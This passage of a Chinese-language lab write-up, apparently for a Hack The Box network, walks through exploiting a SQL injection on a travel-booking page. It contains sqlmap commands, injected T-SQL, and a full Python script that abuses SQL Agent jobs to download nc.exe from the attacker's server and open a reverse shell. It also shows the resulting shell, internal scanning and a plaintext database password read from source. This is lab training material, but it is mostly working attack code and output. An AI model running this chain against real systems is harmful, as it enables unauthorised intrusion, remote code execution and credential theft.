>

##### <font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">建表</font>
```bash
sqlmap -r sqlinject --sql-query="CREATE TABLE daedalus.dbo.proxydump3 ([proxy_id] int,[name] sysname,[credential_identity] sysname,[enabled] tinyint,[description] varchar(1024),[user_sid] varbinary(100),[credential_id] int,[credential_identity_exists] int)" --batch
```

##### 请求
```bash
import requests

url = "http://10.13.38.20/book-trip.php"
data = {
    "destination": "test'; EXEC AS LOGIN = N'daedalus_admin'; INSERT INTO daedalus.dbo.proxydump3 EXEC msdb.dbo.sp_help_proxy; REVERT;-- -",
    "adults": "test",
    "children": "test",
}
r = requests.post(url, data=data)
print(r.status_code)
print(r.text[:300])
```

##### <font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">读取</font>
```bash
sqlmap -r sqlinject -D daedalus -T proxydump3 --dump --batch --fresh-queries --force-pivoting
```

##### 返回
> 1. <font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">存在一个可用的 proxy，编号就是 </font>`**<font style="color:rgb(0, 206, 185);background-color:rgb(252, 252, 252);">1</font>**`
> 2. <font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">该 proxy 绑定的真实 Windows 身份是</font><font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);"> </font>`**<font style="color:rgb(0, 206, 185);background-color:rgb(252, 252, 252);">WEB01\svc_dev</font>**`
> 3. <font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">它允许执行 </font>`**<font style="color:rgb(0, 206, 185);background-color:rgb(252, 252, 252);">CmdExec</font>**`<font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);"> 和 </font>`**<font style="color:rgb(0, 206, 185);background-color:rgb(252, 252, 252);">PowerShell</font>**`
>
> <font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">也就是说，后面在 </font>`**<font style="color:rgb(0, 206, 185);background-color:rgb(252, 252, 252);">sp_add_jobstep</font>**`<font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);"> 里使用 </font>`**<font style="color:rgb(0, 206, 185);background-color:rgb(252, 252, 252);">@proxy_id=1</font>**`<font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">，就等于让这个 Job Step 以 </font>`**<font style="color:rgb(0, 206, 185);background-color:rgb(252, 252, 252);">WEB01\svc_dev</font>**`<font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);"> 身份去执行系统命令</font>
>

```bash
proxy_id: 1
name: svc_dev
enabled: 1
credential_identity: WEB01\svc_dev
description: Allow user to access the CmdExec and Powershell subsystems.
```

### 反弹shell
#### 脚本
> **<font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">创建 Agent Job 拿到 shell</font>**<font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);"> 接下来就可以通过 SQL Agent Job 做命令执行</font>
>

```bash
#!/usr/bin/env python3
# 导入 random，用来随机生成 Job 名称，避免重名
import random
# 导入 string，用来取小写字母集合
import string
# 导入 sys，用来读取命令行参数
import sys
# 导入 requests，用来给目标站点发 POST 请求
import requests
# 目标存在 SQL 注入的页面
URL = "http://10.13.38.20/book-trip.php"

def esc(s):
    # SQL 字符串中的单引号需要转义成两个单引号
    # 例如 O'Reilly -> O''Reilly
    # 否则拼进 @command = N'...' 时会截断 SQL 语句
    return s.replace("'", "''")

def send_sql(sql):
    # 把多行 SQL 压成一行，方便直接塞进注入点
    # 同时去掉每行前后的空白
    sql = " ".join(x.strip() for x in sql.splitlines() if x.strip())
    
    # 构造 POST 数据
    data = {
        # 这里的思路是：
        # 1. 用 test' 闭合原本 SQL 中的字符串
        # 2. 分号后面接我们自己的 stacked queries
        # 3. 最后用 -- - 注释掉后面的原始 SQL
        "destination": f"test'; {sql}-- -",

        # 其余参数给正常值，避免页面逻辑报错
        "adults": "test",
        "children": "test"
    }

    # 发起 POST 请求，把注入 payload 送到目标
    r = requests.post(URL, data=data, timeout=20)

    # 打印 HTTP 状态码
    # 注意：200 只表示网页正常返回，不代表 SQL 一定执行成功
    print(f"[+] HTTP {r.status_code}")


def run_job(subsystem, command, proxy_id=1):
    # 随机生成一个 6 位小写字母的前缀
    # 用来当 Job 名和 Step 名，避免重名冲突
    name = ''.join(random.choices(string.ascii_lowercase, k=6))

    # 组装要通过 SQL 注入执行的多条 T-SQL
    sql = f"""
    EXEC AS LOGIN = N'daedalus_admin';
    EXEC msdb.dbo.sp_add_job @job_name = N'{name}_job';
    EXEC msdb.dbo.sp_add_jobstep
        @job_name = N'{name}_job',
        @step_name = N'{name}_step',
        @subsystem = N'{subsystem}',
        @command = N'{esc(command)}',
        @retry_attempts = 1,
        @retry_interval = 5,
        @proxy_id = {proxy_id};
    EXEC msdb.dbo.sp_add_jobserver @job_name = N'{name}_job';
    EXEC msdb.dbo.sp_start_job @job_name = N'{name}_job';
    REVERT;
    """

    # 上面每条 SQL 的作用：
    #
    # EXEC AS LOGIN = N'daedalus_admin';
    # - 切换执行上下文，模拟成 daedalus_admin
    # - 因为前面已经验证过当前用户可以 IMPERSONATE 这个登录
    #
    # sp_add_job
    # - 新建一个 SQL Server Agent Job
    #
    # sp_add_jobstep
    # - 给 Job 增加一个步骤
    # - @subsystem 指定这一步用什么执行器：
    #   * PowerShell  -> 跑 powershell 命令
    #   * CmdExec     -> 跑 cmd 命令
    # - @command 就是这一步真正执行的系统命令
    # - @proxy_id=1 表示这一步使用编号 1 的 Agent Proxy
    #   而你已经验证过 proxy_id=1 对应 WEB01\\svc_dev
    #   所以该步骤会以 WEB01\\svc_dev 身份执行
    #
    # sp_add_jobserver
    # - 把 Job 绑定到当前 SQL Server 实例
    #
    # sp_start_job
    # - 立即启动这个 Job
    #
    # REVERT
    # - 退出 impersonation，恢复原上下文

    # 把这串 SQL 通过注入点发出去
    send_sql(sql)


if __name__ == "__main__":
    # 脚本要求 3 个参数：
    # 1. LHOST：你的攻击机 IP
    # 2. HTTP_PORT：你提供 nc.exe 下载的 HTTP 端口
    # 3. LPORT：反弹 shell 回连的端口
    if len(sys.argv) != 4:
        print(f"usage: {sys.argv[0]} <LHOST> <HTTP_PORT> <LPORT>")
        sys.exit(1)

    # 读取命令行参数
    lhost, http_port, lport = sys.argv[1:]

    # 第一步：构造 PowerShell 下载命令
    # 目标会从你的 HTTP 服务器下载 nc.exe 到当前用户目录
    download_cmd = (
        f"powershell.exe -nop -w hidden -c "
        f"\"(New-Object Net.WebClient).DownloadFile('http://{lhost}:{http_port}/nc.exe',$env:USERPROFILE+'\\nc.exe')\""
    )

    # 通过 SQL Agent Job 执行下载命令
    # subsystem=PowerShell，表示用 PowerShell 子系统运行
    run_job("PowerShell", download_cmd, 1)

    # 第二步：构造执行 nc.exe 的命令
    # 这里会让目标主动连回你的监听端口，并把 cmd 绑上去
    shell_cmd = f"cmd.exe /c %USERPROFILE%\\nc.exe {lhost} {lport} -e cmd"

    # 第一次尝试执行反弹 shell
    run_job("CmdExec", shell_cmd, 1)

    # 再执行一次，提高成功率
    # 有时第一次调度/文件落地稍慢，第二次能补上
    run_job("CmdExec", shell_cmd, 1)
```

#### updog
```bash
┌──(web)─(root㉿kali)-[/home/kali/Desktop/tools/netcat]
└─# updog -p 80
[+] Serving /home/kali/Desktop/tools/netcat on 0.0.0.0:80...
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.                                                                                          
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:80
 * Running on http://61.139.2.134:80
Press CTRL+C to quit

10.13.38.20 - - [24/Mar/2026 21:10:07] "GET /nc64.exe HTTP/1.1" 200 -
```

#### payload
```bash
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Ascension]
└─# python mssql-exploit.py 10.10.16.32 80 4444
```

#### Getshell
```bash
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Ascension]
└─# nc -nlvp 4444 
listening on [any] 4444 ...
connect to [10.10.16.32] from (UNKNOWN) [10.13.38.20] 50126
Microsoft Windows [Version 10.0.17763.6292]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
whoami
web01\svc_dev
```

# web01\svc_dev-192.168.10.39
## Getflag
```bash
C:\Users\svc_dev\Desktop>type flag.txt
type flag.txt
ASCENSION{y0ur_4gent_is_oUr_aG3n7}
```

## 信息收集
### ipconfig
```bash
C:\WINDOWS\system32>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet1:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.10.39
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 

Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 10.13.38.20
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.13.38.2
```

### 查看监听
```bash
C:\WINDOWS\system32>netstat -an | findstr LISTENING
netstat -an | findstr LISTENING
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:5357           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49713          0.0.0.0:0              LISTENING
  TCP    10.13.38.20:139        0.0.0.0:0              LISTENING
  TCP    127.0.0.1:1434         0.0.0.0:0              LISTENING
  TCP    192.168.10.39:139      0.0.0.0:0              LISTENING
  TCP    [::]:80                [::]:0                 LISTENING
  TCP    [::]:135               [::]:0                 LISTENING
  TCP    [::]:445               [::]:0                 LISTENING
  TCP    [::]:1433              [::]:0                 LISTENING
  TCP    [::]:3389              [::]:0                 LISTENING
  TCP    [::]:5357              [::]:0                 LISTENING
  TCP    [::]:5985              [::]:0                 LISTENING
  TCP    [::]:47001             [::]:0                 LISTENING
  TCP    [::]:49664             [::]:0                 LISTENING
  TCP    [::]:49665             [::]:0                 LISTENING
  TCP    [::]:49666             [::]:0                 LISTENING
  TCP    [::]:49667             [::]:0                 LISTENING
  TCP    [::]:49668             [::]:0                 LISTENING
  TCP    [::]:49669             [::]:0                 LISTENING
  TCP    [::]:49713             [::]:0                 LISTENING
  TCP    [::1]:1434             [::]:0                 LISTENING
```

### whoami
```bash
C:\Users\svc_dev\Desktop>whoami /all
whoami /all

USER INFORMATION
----------------

User Name     SID                                          
============= =============================================
web01\svc_dev S-1-5-21-197600473-3515118913-3158175032-1003


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes                                        
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                   Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192                                                    


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State  
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

ERROR: Unable to get user claims information.
```

### 内网探测
```bash
for /L %i in (1,1,255) do @ping -n 1 -w 200 192.168.10.%i | find "TTL="

Reply from 192.168.10.6: bytes=32 time<1ms TTL=128
```

### 端口扫描-192.168.10.6
```bash
export ip=192.168.10.6; for port in $(seq 1 65535); do timeout 0.01 bash -c "</dev/tcp/$ip/$port && echo Port open $port || echo Port closed $port > /dev/null" 2>/dev/null; done

WARNING: 端口 53 开放
WARNING: 端口 88 开放
WARNING: 端口 135 开放
WARNING: 端口 139 开放
```

### 计划任务
```bash
C:\inetpub\wwwroot>schtasks /query
schtasks /query

Folder: \
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
INFO: There are no scheduled tasks presently available at your access level.

Folder: \Microsoft
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
INFO: There are no scheduled tasks presently available at your access level.

Folder: \Microsoft\VisualStudio
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
VSIX Auto Update 15.9.3043               3/25/2026 2:04:14 AM   Ready          

Folder: \Microsoft\VisualStudio\Updates
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
UpdateConfiguration_S-1-5-21-197600473-3 N/A                    Ready          
UpdateConfiguration_S-1-5-21-2133302606- N/A                    Ready          

Folder: \Microsoft\Windows
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
Server Initial Configuration Task        N/A                    Disabled       

Folder: \Microsoft\Windows\.NET Framework
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
.NET Framework NGEN v4.0.30319           N/A                    Ready          
.NET Framework NGEN v4.0.30319 64        N/A                    Ready          
.NET Framework NGEN v4.0.30319 64 Critic N/A                    Disabled       
.NET Framework NGEN v4.0.30319 Critical  N/A                    Disabled       

Folder: \Microsoft\Windows\Active Directory Rights Management Services Client
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
AD RMS Rights Policy Template Management N/A                    Disabled       
AD RMS Rights Policy Template Management N/A                    Ready          

Folder: \Microsoft\Windows\AppID
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
PolicyConverter                          N/A                    Disabled       
SmartScreenSpecific                      N/A                    Ready          
VerifiedPublisherCertStoreCheck          N/A                    Disabled       

Folder: \Microsoft\Windows\Application Experience
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
Microsoft Compatibility Appraiser        3/25/2026 4:46:14 AM   Ready          
ProgramDataUpdater                       N/A                    Ready          
StartupAppTask                           N/A                    Ready          

Folder: \Microsoft\Windows\ApplicationData
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
appuriverifierdaily                      N/A                    Ready          
appuriverifierinstall                    N/A                    Ready          
CleanupTemporaryState                    N/A                    Ready          
DsSvcCleanup                             N/A                    Ready          

Folder: \Microsoft\Windows\AppxDeploymentClient
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
Pre-staged app cleanup                   N/A                    Disabled       

Folder: \Microsoft\Windows\Autochk
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
AutochkTask                              3/24/2026 10:20:47 AM  Running        
AutoProtect                              N/A                    Disabled       
Proxy                                    N/A                    Ready          

Folder: \Microsoft\Windows\BitLocker
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
BitLocker Encrypt All Drives             N/A                    Ready          
BitLocker MDM policy Refresh             N/A                    Ready          

Folder: \Microsoft\Windows\Bluetooth
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
UninstallDeviceTask                      N/A                    Disabled       

Folder: \Microsoft\Windows\BrokerInfrastructure
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
BgTaskRegistrationMaintenanceTask        N/A                    Ready          

Folder: \Microsoft\Windows\Chkdsk
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
ProactiveScan                            N/A                    Ready          
SyspartRepair                            N/A                    Ready          

Folder: \Microsoft\Windows\CloudExperienceHost
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
CreateObjectTask                         N/A                    Ready          

Folder: \Microsoft\Windows\Customer Experience Improvement Program
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
Consolidator                             3/24/2026 12:00:00 PM  Ready          
UsbCeip                                  N/A                    Ready          

Folder: \Microsoft\Windows\Data Integrity Scan
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
Data Integrity Scan                      4/8/2026 3:44:08 PM    Ready          
Data Integrity Scan for Crash Recovery   N/A                    Ready          

Folder: \Microsoft\Windows\Defrag
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
ScheduledDefrag                          N/A                    Ready          

Folder: \Microsoft\Windows\Device Information
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
Device                                   3/25/2026 3:18:32 AM   Ready          

Folder: \Microsoft\Windows\Diagnosis
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
Scheduled                                N/A                    Ready          

Folder: \Microsoft\Windows\DirectX
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
DXGIAdapterCache                         N/A                    Ready          

Folder: \Microsoft\Windows\DiskCleanup
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
SilentCleanup                            N/A                    Ready          

Folder: \Microsoft\Windows\DiskDiagnostic
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
Microsoft-Windows-DiskDiagnosticDataColl N/A                    Disabled       
Microsoft-Windows-DiskDiagnosticResolver N/A                    Disabled       

Folder: \Microsoft\Windows\DiskFootprint
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
Diagnostics                              N/A                    Ready          
StorageSense                             N/A                    Ready          

Folder: \Microsoft\Windows\EDP
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
EDP App Launch Task                      N/A                    Ready          
EDP Auth Task                            N/A                    Ready          
EDP Inaccessible Credentials Task        N/A                    Ready          
StorageCardEncryption Task               N/A                    Ready          

Folder: \Microsoft\Windows\ErrorDetails
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
EnableErrorDetailsUpdate                 N/A                    Ready          
ErrorDetailsUpdate                       N/A                    Disabled       

Folder: \Microsoft\Windows\ExploitGuard
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
ExploitGuard MDM policy Refresh          N/A                    Ready          

Folder: \Microsoft\Windows\File Classification Infrastructure
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
Property Definition Sync                 N/A                    Disabled       

Folder: \Microsoft\Windows\Flighting
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
INFO: There are no scheduled tasks presently available at your access level.

Folder: \Microsoft\Windows\Flighting\FeatureConfig
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
ReconcileFeatures                        N/A                    Ready          

Folder: \Microsoft\Windows\Flighting\OneSettings
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
RefreshCache                             3/25/2026 3:41:49 AM   Ready          

Folder: \Microsoft\Windows\InstallService
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
ScanForUpdates                           N/A                    Disabled       
ScanForUpdatesAsUser                     N/A                    Disabled       
WakeUpAndContinueUpdates                 N/A                    Disabled       
WakeUpAndScanForUpdates                  N/A                    Disabled       

Folder: \Microsoft\Windows\Live
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
INFO: There are no scheduled tasks presently available at your access level.

Folder: \Microsoft\Windows\Location
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
Notifications                            N/A                    Ready          
WindowsActionDialog                      N/A                    Ready          

Folder: \Microsoft\Windows\Maintenance
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
WinSAT                                   N/A                    Disabled       

Folder: \Microsoft\Windows\Maps
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
MapsToastTask                            N/A                    Disabled       
MapsUpdateTask                           N/A                    Disabled       

Folder: \Microsoft\Windows\MemoryDiagnostic
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
ProcessMemoryDiagnosticEvents            N/A                    Disabled       
RunFullMemoryDiagnostic                  N/A                    Disabled       

Folder: \Microsoft\Windows\Mobile Broadband Accounts
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
MNO Metadata Parser                      N/A                    Ready          

Folder: \Microsoft\Windows\MUI
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
LPRemove                                 N/A                    Ready          

Folder: \Microsoft\Windows\Multimedia
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
SystemSoundsService                      N/A                    Disabled       

Folder: \Microsoft\Windows\NetTrace
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
GatherNetworkInfo                        N/A                    Ready          

Folder: \Microsoft\Windows\Offline Files
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
Background Synchronization               N/A                    Disabled       
Logon Synchronization                    N/A                    Disabled       

Folder: \Microsoft\Windows\PI
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
SecureBootEncodeUEFI                     4/1/2026 12:00:00 PM   Ready          

Folder: \Microsoft\Windows\PLA
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
Server Manager Performance Monitor       N/A                    Disabled       

Folder: \Microsoft\Windows\Plug and Play
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
Device Install Group Policy              N/A                    Ready          
Device Install Reboot Required           N/A                    Ready          
Plug and Play Cleanup                    N/A                    Ready          
Sysprep Generalize Drivers               N/A                    Ready          

Folder: \Microsoft\Windows\Power Efficiency Diagnostics
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
AnalyzeSystem                            N/A                    Ready          

Folder: \Microsoft\Windows\RecoveryEnvironment
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
VerifyWinRE                              N/A                    Disabled       

Folder: \Microsoft\Windows\Server Manager
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
CleanupOldPerfLogs                       N/A                    Ready          
ServerManager                            N/A                    Ready          

Folder: \Microsoft\Windows\Servicing
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
StartComponentCleanup                    N/A                    Ready          

Folder: \Microsoft\Windows\SettingSync
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
BackgroundUploadTask                     N/A                    Ready          
BackupTask                               N/A                    Ready          
NetworkStateChangeTask                   N/A                    Ready          

Folder: \Microsoft\Windows\SharedPC
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
Account Cleanup                          N/A                    Disabled       

Folder: \Microsoft\Windows\Shell
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
CreateObjectTask                         N/A                    Ready          
IndexerAutomaticMaintenance              N/A                    Ready          

Folder: \Microsoft\Windows\Software Inventory Logging
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
Collection                               N/A                    Disabled       
Configuration                            N/A                    Ready          

Folder: \Microsoft\Windows\SpacePort
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
SpaceAgentTask                           N/A                    Ready          
SpaceManagerTask                         N/A                    Ready          

Folder: \Microsoft\Windows\Speech
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
HeadsetButtonPress                       N/A                    Ready          
SpeechModelDownloadTask                  3/25/2026 12:38:12 AM  Ready          

Folder: \Microsoft\Windows\Storage Tiers Management
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
Storage Tiers Management Initialization  N/A                    Ready          
Storage Tiers Optimization               N/A                    Disabled       

Folder: \Microsoft\Windows\termsrv
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
INFO: There are no scheduled tasks presently available at your access level.

Folder: \Microsoft\Windows\TextServicesFramework
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
MsCtfMonitor                             N/A                    Ready          

Folder: \Microsoft\Windows\Time Synchronization
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
ForceSynchronizeTime                     N/A                    Ready          
SynchronizeTime                          N/A                    Ready          

Folder: \Microsoft\Windows\Time Zone
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
SynchronizeTimeZone                      N/A                    Ready          

Folder: \Microsoft\Windows\UPnP
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
UPnPHostConfig                           N/A                    Disabled       

Folder: \Microsoft\Windows\Windows Error Reporting
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
QueueReporting                           3/24/2026 11:01:57 AM  Ready          

Folder: \Microsoft\Windows\Windows Filtering Platform
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
BfeOnServiceStartTypeChange              N/A                    Ready          

Folder: \Microsoft\Windows\Windows Media Sharing
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
UpdateLibrary                            N/A                    Ready          

Folder: \Microsoft\Windows\WindowsColorSystem
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
Calibration Loader                       N/A                    Ready          

Folder: \Microsoft\Windows\WindowsUpdate
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
Scheduled Start                          3/24/2026 8:51:36 PM   Ready          

Folder: \Microsoft\Windows\Wininet
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
CacheTask                                N/A                    Running        

Folder: \Microsoft\Windows\Workplace Join
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
Automatic-Device-Join                    N/A                    Ready          
Recovery-Check                           N/A                    Disabled       

Folder: \Microsoft\XblGameSave
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
XblGameSaveTask                          N/A                    Ready          
XblGameSaveTaskLogon                     N/A                    Ready          

```

### 数据库账密
> 拿到数据库账号密码daedalus/L3tM3FlyUpH1gh
>

```bash
C:\inetpub\wwwroot>type C:\inetpub\wwwroot\book-trip.php
type C:\inetpub\wwwroot\book-trip.php
<?php
$serverName = "WEB01";
$uid = "daedalus";
$pwd = "L3tM3FlyUpH1gh";
$databaseName = "daedalus";

$connectionInfo = array("UID" => $uid,
    "PWD" => $pwd,
    "Database" => $databaseName);

try {
    /* Connect using SQL Server Authentication. */
    $conn = sqlsrv_connect($serverName, $connectionInfo);
} catch (Exception $e) {
    print $e;
}
?>
```

### DC IP
```bash
C:\Users\svc_dev\Desktop>ping dc
ping dc

Pinging DC.local [10.13.38.53] with 32 bytes of data:
Reply from 10.13.38.53: bytes=32 time=2ms TTL=128
Reply from 10.13.38.53: bytes=32 time<1ms TTL=128
Reply from 10.13.38.53: bytes=32 time<1ms TTL=128
Reply from 10.13.38.53: bytes=32 time<1ms TTL=128

Ping statistics for 10.13.38.53:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 2ms, Average = 0ms
```

### rustscan-local域控
```bash
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Ascension]
└─# rustscan -a 10.13.38.53 -- -A -n
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Port scanning: Making networking exciting since... whenever.

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.13.38.53:53
Open 10.13.38.53:88
Open 10.13.38.53:135
Open 10.13.38.53:139
Open 10.13.38.53:389
Open 10.13.38.53:445
Open 10.13.38.53:464
Open 10.13.38.53:593
Open 10.13.38.53:636
Open 10.13.38.53:3268
Open 10.13.38.53:3269
Open 10.13.38.53:3389
Open 10.13.38.53:9389
Open 10.13.38.53:49664
Open 10.13.38.53:49667
Open 10.13.38.53:59727
Open 10.13.38.53:59730
Open 10.13.38.53:59728
Open 10.13.38.53:59744
Open 10.13.38.53:59766
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -A -n" on ip 10.13.38.53
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-25 13:07 +0800
NSE: Loaded 158 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:07
Completed NSE at 13:07, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:07
Completed NSE at 13:07, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:07
Completed NSE at 13:07, 0.00s elapsed
Initiating Ping Scan at 13:07
Scanning 10.13.38.53 [4 ports]
Completed Ping Scan at 13:07, 0.20s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 13:07
Scanning 10.13.38.53 [20 ports]
Discovered open port 59730/tcp on 10.13.38.53
Discovered open port 135/tcp on 10.13.38.53
Discovered open port 59727/tcp on 10.13.38.53
Discovered open port 53/tcp on 10.13.38.53
Discovered open port 3389/tcp on 10.13.38.53
Discovered open port 49664/tcp on 10.13.38.53
Discovered open port 59744/tcp on 10.13.38.53
Discovered open port 139/tcp on 10.13.38.53
Discovered open port 445/tcp on 10.13.38.53
Discovered open port 464/tcp on 10.13.38.53
Discovered open port 636/tcp on 10.13.38.53
Discovered open port 389/tcp on 10.13.38.53
Discovered open port 3269/tcp on 10.13.38.53
Discovered open port 88/tcp on 10.13.38.53
Discovered open port 3268/tcp on 10.13.38.53
Discovered open port 593/tcp on 10.13.38.53
Discovered open port 9389/tcp on 10.13.38.53
Discovered open port 59728/tcp on 10.13.38.53
